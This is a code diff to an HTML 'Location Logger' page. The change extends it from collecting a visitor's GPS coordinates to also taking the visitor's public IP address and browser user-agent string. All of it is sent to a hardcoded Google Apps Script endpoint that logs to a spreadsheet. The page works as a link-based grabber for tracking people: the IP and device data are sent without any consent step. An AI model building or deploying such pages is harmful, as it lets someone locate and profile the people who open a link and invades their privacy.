@@ -4,38 +4,49 @@
   <title>Location Logger</title>
 </head>
 <body>
-  <h2>Getting your location...</h2>
+  <h2>Capturing your details...</h2>
+
   <script>
-    // Replace this with your Google Apps Script Web App URL
-    const scriptURL = "https://script.googleusercontent.com/macros/echo?user_content_key=AehSKLjkk4n4gKsELpZ9vP5Fnb4SOc9xv3K3sxzjiSQQPvp3wmGEi8eNjsuVCf-23q7GTlxaM589rpHKHmWHWkdethOdnGziyzOl6WGnXkTNFbLWinZQcxjMJE45xUOrzvVw6juTpQp7kWS5Mwf0-mUNq1rxBEvhK7b2QozYDM5gUjqcHkgLGqmvnGLDApm7aVa0Rncdrvr4XEh3aXVTkADDLiGWCwDsSwA3hyPdzILB-y7dT96Lug9n-svON-vjbPvCgYX8OXNW1Lk9PgTWB7VQoFO3Vc57Uw&lib=M5xbecuxQhybtKeSIrtBgiwqSCHyOSeLm";
+    const scriptURL = "https://script.googleusercontent.com/macros/echo?user_content_key=AehSKLikxO6yf22ZjFFi8JjaDrtLKkOVggWtdReCeNeIy_zz3mVPptP8Q0Yavoa4DoIAdZGY2aNFvXDZbf7f81UGVLwh57cg_sc05aSoASGJIvrvzYlshhLXt-EPQtj6aVEwaq2zKCOsbQrLBxVsqwmOtQIMb2FrQ6-wkEcjvj90iBbu7p74f_n1OLBUrkfQd0fRxVr_CI0XV-2B3BUTPBSgd5HkQVDhx4ijnZ1ih_-B1TGjV2bDGFmt_IYx0YDuUMKuGegBuAFDhmXrLeYo9JEcmSotxmszTA&lib=M5xbecuxQhybtKeSIrtBgiwqSCHyOSeLm"; // 👈 replace with your Google Apps Script Web App URL
 
-    // Get user location
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(success, error);
-    } else {
-      document.body.innerHTML = "Geolocation is not supported by this browser.";
-    }
+    // Get device/browser info
+    const deviceInfo = navigator.userAgent;
 
-    function success(position) {
-      const latitude = position.coords.latitude;
-      const longitude = position.coords.longitude;
+    // Get IP address from external API
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(ipData => {
+        const ipAddress = ipData.ip;
 
-      // Send data to Google Sheet
-      fetch(`${scriptURL}?lat=${latitude}&lng=${longitude}`)
-        .then(() => {
-          document.body.innerHTML = `<h3>✅ Location captured!</h3>
-          <p>Latitude: ${latitude}</p>
-          <p>Longitude: ${longitude}</p>`;
-        })
-        .catch(() => {
-          document.body.innerHTML = "❌ Failed to send location.";
-        });
-    }
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            position => {
+              const latitude = position.coords.latitude;
+              const longitude = position.coords.longitude;
 
-    function error() {
-      document.body.innerHTML = "❌ Unable to retrieve your location.";
-    }
+              // Send all data to Google Sheets
+              fetch(`${scriptURL}?lat=${latitude}&lng=${longitude}&ip=${ipAddress}&device=${encodeURIComponent(deviceInfo)}`)
+                .then(() => {
+                  document.body.innerHTML = `
+                    <h2>✅ Details Captured!</h2>
+                    <h3>Location:</h3>
+                    <p>Latitude: ${latitude}</p>
+                    <p>Longitude: ${longitude}</p>
+                    <h3>Network:</h3>
+                    <p>IP Address: ${ipAddress}</p>
+                    <h3>Device Info:</h3>
+                    <p>${deviceInfo}</p>
+                  `;
+                });
+            },
+            () => {
+              document.body.innerHTML = "❌ Unable to retrieve your location.";
+            }
+          );
+        } else {
+          document.body.innerHTML = "❌ Geolocation not supported.";
+        }
+      });
   </script>
 </body>
 </html>
-
